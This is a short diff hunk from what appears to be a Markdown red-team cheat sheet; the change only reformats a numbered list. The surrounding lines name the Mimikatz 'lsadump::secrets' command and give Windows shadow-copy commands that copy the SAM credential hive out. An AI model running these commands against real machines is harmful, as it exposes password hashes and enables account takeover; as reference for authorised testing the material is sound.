@@ -418,18 +418,20 @@ LSA secrets can be dumped using Mimikatz: lsadump::secrets
 
 ### Red Team Examples
 Some methods for dump credentials using native operating system files.
+
 <br>
 
 #### Copy SAM file from shadows
 
 1. Create shadow copy: 
 `wmic shadowcopy call create Volume=C:\`
-<br>
-2. Enumerate shadows and the path of shadows:
+
+1. Enumerate shadows and the path of shadows:
 `vssadmin List Shadows`
-<br>
-3. Copy SAM file from shadow: 
+
+1. Copy SAM file from shadow: 
 `copy $PathToShadow\Windows\System32\config\SAM C:\temp`
+
 <br>
 
 ##### From Registry
